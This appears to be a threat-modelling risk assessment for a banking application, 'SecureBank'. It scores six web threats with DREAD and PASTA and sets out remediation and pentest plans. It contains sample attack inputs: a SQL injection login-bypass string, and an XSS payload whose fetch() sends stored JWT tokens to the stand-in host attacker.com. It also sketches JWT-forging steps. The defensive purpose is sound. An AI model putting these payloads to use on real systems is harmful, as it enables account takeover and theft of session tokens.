# SecureBank - DREAD/PASTA Risk Assessment Matrix
**Phase 1 - Risk Analysis**

---

## Executive Summary
This document provides quantitative risk scoring for identified threats using two industry-standard frameworks:
- **DREAD**: Damage, Reproducibility, Exploitability, Affected Users, Discoverability
- **PASTA**: Process for Attack Simulation and Threat Analysis

---

## DREAD Scoring Framework

**Scale: 1-10 for each factor**
- **Damage Potential**: How much harm if exploited? (1=minimal, 10=catastrophic)
- **Reproducibility**: How easy to reproduce the attack? (1=extremely difficult, 10=trivial)
- **Exploitability**: How much skill/tools needed? (1=expert only, 10=script kiddie)
- **Affected Users**: Percentage of users impacted (1=none, 10=100%)
- **Discoverability**: How obvious is the vulnerability? (1=secret, 10=trivial)

**DREAD Score = (D+R+E+A+Disc) / 5**
- **Score ≥ 8**: CRITICAL - Fix immediately
- **Score 6-7.9**: HIGH - Fix in this sprint
- **Score 4-5.9**: MEDIUM - Schedule fix
- **Score < 4**: LOW - Monitor, low priority

---

## Threat 1: Brute Force Login Attack (T1110)

### DREAD Analysis

| Factor | Score | Reasoning |
|--------|-------|-----------|
| **D**amage | 10 | Complete account takeover, funds stolen, identity theft |
| **R**eproducibility | 10 | Just send POST requests, trivial to reproduce |
| **E**xploitability | 10 | No special tools needed, just curl or Postman |
| **A**ffected Users | 10 | ANY user account can be targeted, admin accounts at risk |
| **D**iscoverability | 10 | /login endpoint is public, obvious attack surface |
| | | |
| **DREAD SCORE** | **10.0** | 🔴 **CRITICAL** |

### PASTA Analysis
- **Threat Agent**: External attacker with basic script knowledge
- **Attack Vector**: HTTP POST to /login
- **Impact**: Account compromise, financial loss
- **Likelihood**: VERY HIGH (no rate limiting present)
- **Visibility**: HIGH (easy to detect with monitoring)

### Detailed Assessment
```
Current State:
- No rate limiting ❌
- No account lockout ❌
- No CAPTCHA ❌
- No monitoring ❌

Attack Scenario:
1. Attacker has list of 1000 common passwords
2. Sends 100 login attempts per second
3. After ~50-100 attempts, account compromised
4. Attacker transfers all funds

Time to Compromise: < 5 minutes with simple script
```

### Remediation Priority: 🔴 CRITICAL - FIX BEFORE LAUNCH
- Implement Redis-based rate limiting
- Add account lockout after 5 failed attempts
- Configure IP-based blocking
- Set up alerting for suspicious login patterns

---

## Threat 2: SQL Injection (T1190)

### DREAD Analysis

| Factor | Score | Reasoning |
|--------|-------|-----------|
| **D**amage | 10 | Complete database compromise, all data exposed |
| **R**eproducibility | 8 | Requires understanding SQL, but fairly straightforward |
| **E**xploitability | 3 | Using ORM, parameterized queries make it very difficult |
| **A**ffected Users | 10 | ALL users compromised in data breach scenario |
| **D**iscoverability | 7 | Attacker can probe /login endpoint for SQLi |
| | | |
| **DREAD SCORE** | **7.6** | 🟠 **HIGH** |

### PASTA Analysis
- **Threat Agent**: Attacker with SQL knowledge
- **Attack Vector**: User input fields (username, email, password)
- **Impact**: Database compromise, complete data breach
- **Likelihood**: LOW (FastAPI ORM provides protection)
- **Visibility**: MEDIUM (SAST tools can detect)

### Detailed Assessment
```
Current State:
✅ Using SQLAlchemy ORM (good defense)
✅ Input validation on email format
⚠️  Need to verify: No raw SQL queries anywhere

Attack Scenario:
If raw SQL is used anywhere:
  POST /login
  username: "admin' OR 1=1--"
  password: "anything"
  
  Result: Bypasses authentication, returns admin user

Probability of Vulnerability: MEDIUM
- ORM usage is strong indicator of protection
- But need SAST verification
```

### Remediation Priority: 🟠 HIGH - VERIFY & HARDEN
- Run SonarQube SAST scan
- Review all database queries
- Ensure parameterized queries everywhere
- Add input validation on all fields

---

## Threat 3: XSS - Cross-Site Scripting (T1059.007)

### DREAD Analysis

| Factor | Score | Reasoning |
|--------|-------|-----------|
| **D**amage | 10 | Steal JWT tokens, hijack accounts, malware injection |
| **R**eproducibility | 9 | Easy to inject JavaScript, many payload options |
| **E**xploitability | 8 | Just type JavaScript in input field, no special tools |
| **A**ffected Users | 10 | All users viewing a page with injected script |
| **D**iscoverability | 9 | Transfer note field is obvious injection point |
| | | |
| **DREAD SCORE** | **9.2** | 🔴 **CRITICAL** |

### PASTA Analysis
- **Threat Agent**: Attacker with JavaScript knowledge
- **Attack Vector**: Text input fields (transfer note, etc.)
- **Impact**: Token theft, session hijacking, malware
- **Likelihood**: VERY HIGH (no XSS protections visible)
- **Visibility**: HIGH (if monitoring JavaScript execution)

### Detailed Assessment
```
Current Vulnerabilities:
❌ NO DOMPurify library
❌ NO Content-Security-Policy header
❌ JWT stored in localStorage (XSS-accessible)
❌ NO input validation on transfer notes

Attack Scenario:
1. Attacker transfers $100 with note:
   <script>fetch('http://attacker.com?token=' + 
   localStorage.getItem('token'))</script>

2. When another user views transaction history:
   Script executes in browser
   JWT token sent to attacker server

3. Attacker uses stolen JWT to:
   - Access victim's account
   - Transfer all funds
   - Change password

Time to Compromise: IMMEDIATE when victim views page
```

### Remediation Priority: 🔴 CRITICAL - FIX BEFORE LAUNCH
- Add DOMPurify library
- Implement Content-Security-Policy header
- Move JWT from localStorage to httpOnly cookie
- Validate/sanitize all text inputs
- Add output encoding for display

---

## Threat 4: Privilege Escalation (T1078)

### DREAD Analysis

| Factor | Score | Reasoning |
|--------|-------|-----------|
| **D**amage | 10 | Become admin, access all data, create backdoor accounts |
| **R**eproducibility | 5 | Need valid JWT, ability to modify/forge it |
| **E**xploitability | 7 | Tools available if JWT not signed or weak secret |
| **A**ffected Users | 10 | Any customer JWT can potentially become admin |
| **D**iscoverability | 6 | Attacker needs to know /admin endpoint exists |
| | | |
| **DREAD SCORE** | **7.6** | 🟠 **HIGH** |

### PASTA Analysis
- **Threat Agent**: Compromised customer with valid JWT
- **Attack Vector**: JWT modification/forging
- **Impact**: Admin access, complete system control
- **Likelihood**: MEDIUM (depends on JWT implementation)
- **Visibility**: HIGH (403 errors logged)

### Detailed Assessment
```
Attack Scenarios:

Scenario A - Weak JWT Signing:
1. Attacker gets customer JWT: {"sub": "user_123", "role": "customer"}
2. Modifies role to: {"sub": "user_123", "role": "admin"}
3. Re-signs with weak secret
4. Uses forged JWT to call /admin endpoint
Result: Admin access! 🔴

Scenario B - No JWT Verification:
1. Attacker creates JWT with role=admin
2. Server doesn't verify signature
3. Just reads role field
Result: Instant admin access! 🔴

Scenario C - Strong Implementation:
1. JWT signed with RS256 (asymmetric)
2. Server verifies signature with public key
3. Modified JWT won't pass validation
Result: Rejected, 403 Forbidden ✅

Current Implementation: UNKNOWN
Need to verify JWT implementation
```

### Remediation Priority: 🟠 HIGH - VERIFY IMMEDIATELY
- Verify JWT signed with RS256 (asymmetric)
- Confirm server validates signature every request
- Ensure role field cannot be modified
- Test: Try to use customer JWT on /admin (should fail)

---

## Threat 5: Broken Object Level Authorization (T1212)

### DREAD Analysis

| Factor | Score | Reasoning |
|--------|-------|-----------|
| **D**amage | 10 | Access other users' account data, transfer funds |
| **R**eproducibility | 10 | Just change account_id in URL, very easy |
| **E**xploitability | 10 | No special tools, just modify URL parameter |
| **A**ffected Users | 10 | Every user's account could be accessed by attacker |
| **D**iscoverability | 9 | API endpoints are enumerable, obvious attack |
| | | |
| **DREAD SCORE** | **9.8** | 🔴 **CRITICAL** |

### PASTA Analysis
- **Threat Agent**: Authenticated attacker (compromised customer)
- **Attack Vector**: API endpoints with account_id parameter
- **Impact**: Unauthorized access to other accounts
- **Likelihood**: VERY HIGH (if authorization checks missing)
- **Visibility**: LOW (looks like legitimate API call)

### Detailed Assessment
```
Attack Scenario:
1. User logs in, gets JWT with sub="user_1"
2. Views own account: GET /account/1 → Returns user 1's data ✅
3. Attacker modifies URL: GET /account/2
4. Expected: 403 Forbidden (not their account)
5. Actual: Returns user 2's balance, transfer history ❌

If vulnerable:
- Attacker can view all account balances
- Transfer funds from any account to their own
- Complete financial fraud

Current Implementation: UNKNOWN
Need to verify authorization middleware
```

### Remediation Priority: 🔴 CRITICAL - FIX BEFORE LAUNCH
- Add authorization middleware to Account Service
- Validate: JWT.sub must equal requested account_id
- Return 403 if mismatch
- Test all endpoints for BOLA vulnerability

---

## Threat 6: Account Enumeration (T1589)

### DREAD Analysis

| Factor | Score | Reasoning |
|--------|-------|-----------|
| **D**amage | 4 | Information gathering, no direct harm |
| **R**eproducibility | 10 | Send requests, observe error messages |
| **E**xploitability | 10 | Trivial, just try different usernames |
| **A**ffected Users | 5 | Affects user privacy, not financial |
| **D**iscoverability | 10 | Error messages explicitly state "username exists" |
| | | |
| **DREAD SCORE** | **7.8** | 🟠 **HIGH** |

### PASTA Analysis
- **Threat Agent**: Attacker without credentials
- **Attack Vector**: /register endpoint
- **Impact**: Account enumeration, privacy leak
- **Likelihood**: HIGH (obvious if tested)
- **Visibility**: LOW (looks like normal registration attempts)

### Detailed Assessment
```
Current Vulnerability:
POST /register
username: "admin"

Response Option A (Vulnerable):
{"error": "Username already exists"}
→ Attacker knows "admin" is valid user 🔴

Response Option B (Secure):
{"error": "Account creation failed"}
→ Attacker can't tell if username exists ✅

Mitigation:
- Use generic error messages
- Don't reveal whether username exists
- Rate limit registration attempts
```

### Remediation Priority: 🟠 HIGH - EASY FIX
- Use generic error message for all registration failures
- Log actual error server-side for debugging
- Rate limit /register endpoint

---

## Risk Matrix Summary Table

| # | Threat | DREAD | PASTA | Overall | Status | Fix By |
|---|--------|-------|-------|---------|--------|--------|
| 1 | Brute Force (T1110) | 10.0 | CRITICAL | 🔴 CRITICAL | ❌ NOT FIXED | Day 1 |
| 2 | SQL Injection (T1190) | 7.6 | HIGH | 🟠 HIGH | ⚠️ NEEDS VERIFY | Day 2 |
| 3 | XSS / Token Theft (T1059) | 9.2 | CRITICAL | 🔴 CRITICAL | ❌ NOT FIXED | Day 1 |
| 4 | Privilege Escalation (T1078) | 7.6 | HIGH | 🟠 HIGH | ⚠️ NEEDS VERIFY | Day 2 |
| 5 | Broken Object Auth (T1212) | 9.8 | CRITICAL | 🔴 CRITICAL | ⚠️ NEEDS VERIFY | Day 1 |
| 6 | Account Enumeration (T1589) | 7.8 | HIGH | 🟠 HIGH | ✅ EASY FIX | Day 1 |

---

## Risk Heat Map

```
CRITICAL (Fix Immediately):
  - Brute Force (10.0)
  - XSS/Token Theft (9.2)
  - Broken Object Auth (9.8)

HIGH (Fix This Sprint):
  - SQL Injection (7.6) - if verified as vulnerable
  - Privilege Escalation (7.6) - if JWT weak
  - Account Enumeration (7.8)

MEDIUM/LOW:
  - None identified at this stage
```

---

## Remediation Timeline

### CRITICAL FIXES (Before Demo - June 10)

**Priority 1 - Rate Limiting (Day 1-2)**
```
Task: Implement Redis-based rate limiting
Location: Auth Service /login endpoint
Requirement: Max 5 attempts per 5 minutes per IP
Testing: Brute force should fail after 5 attempts
```

**Priority 2 - XSS Protection (Day 1-2)**
```
Task: Add DOMPurify + CSP + httpOnly cookie
Location: Frontend + API responses
Requirement: <script> tags stripped/blocked
Testing: XSS payload in transfer note should fail
```

**Priority 3 - Object Auth (Day 2-3)**
```
Task: Add authorization middleware
Location: Account Service
Requirement: Verify JWT.sub == requested_account_id
Testing: Access other user's account should return 403
```

### HIGH PRIORITY FIXES (By Day 5)

**Priority 4 - JWT Verification (Day 3)**
```
Task: Verify RS256 signing + validation
Location: Security.py
Testing: Modified JWT should be rejected
```

**Priority 5 - SQL Injection Verification (Day 3)**
```
Task: SAST scan with SonarQube + manual review
Testing: SQLi payloads should be rejected
```

**Priority 6 - Generic Error Messages (Day 3)**
```
Task: Update error responses
Location: Auth Service endpoints
Testing: Same message for username/password errors
```

---

## Testing Strategy (Pentesting)

### Red Team Attack Plan

| Test | Expected Result | Actual Result | Pass/Fail |
|------|-----------------|---------------|-----------|
| Send 10 rapid login requests | 429 after attempt 5 | ? | ? |
| SQLi: `admin' OR 1=1--` | 400 Bad Request | ? | ? |
| XSS in transfer note | Blocked by CSP | ? | ? |
| Use customer JWT on /admin | 403 Forbidden | ? | ? |
| Access another account | 403 Forbidden | ? | ? |
| Register with existing username | Generic error | ? | ? |

---

## Success Criteria (Phase 1 Complete)

- [ ] DREAD Score for all threats ≤ 6.0
- [ ] All CRITICAL vulnerabilities identified and scheduled
- [ ] Risk scores approved by team
- [ ] Remediation timeline agreed
- [ ] Pentesting checklist created

---

**Document Status**: Phase 1 - Complete
**Next Steps**: 
1. Create SRD with these threats mapped
2. Create Threat Model (STRIDE diagram)
3. Begin Phase 2: Architecture Design
